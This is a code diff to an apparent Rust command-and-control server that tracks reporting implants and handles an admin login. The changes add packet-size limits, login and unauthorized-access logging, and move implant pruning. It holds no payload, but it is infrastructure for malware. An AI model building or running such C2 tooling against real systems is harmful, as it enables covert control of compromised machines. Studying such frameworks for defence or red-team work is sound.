@@ -6,7 +6,7 @@ use std::{
     time::SystemTime,
 };
 
-use common::{IMPLANT_REPORT_RATE_SECONDS, Implant, Packet, decode, encode};
+use common::{IMPLANT_REPORT_RATE_SECONDS, Implant, MAX_PACKET_SIZE_BYTES, Packet, decode, encode};
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let listener = TcpListener::bind("0.0.0.0:9120")?;
@@ -15,8 +15,9 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     for stream in listener.incoming() {
         let mut stream = stream.unwrap();
+        let ip = stream.peer_addr().unwrap().ip();
 
-        let mut buf = vec![0; 1024];
+        let mut buf = vec![0; MAX_PACKET_SIZE_BYTES];
 
         stream.read(&mut buf).expect("failed to read from stream");
 
@@ -39,8 +40,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 if passwd == password {
                     stream.write(encode(Packet::LoginSuccess).unwrap().as_slice())?;
 
-                    admin_ip = Some(stream.peer_addr().unwrap().ip());
+                    println!("{ip} logged in as admin");
+                    admin_ip = Some(ip);
                 } else {
+                    println!("{ip} failed to log in");
                     stream.write(encode(Packet::LoginFailed).unwrap().as_slice())?;
                 }
             }
@@ -50,6 +53,8 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 {
                     match decoded {
                         Packet::ImplantListRequest => {
+                            remove_old_implants(&mut implants);
+
                             stream.write(
                                 encode(Packet::ImplantList(
                                     implants.values().map(|implant| implant.clone()).collect(),
@@ -62,12 +67,14 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                             stream.write(encode(Packet::C2Alive).unwrap().as_slice())?;
                         }
                     }
+                } else {
+                    println!(
+                        "Unauthorized device tried to access admin commands: {}",
+                        stream.peer_addr().unwrap().ip()
+                    );
                 }
             }
         }
-
-        remove_old_implants(&mut implants);
-        println!("Active implants: {implants:?}");
     }
 
     Ok(())
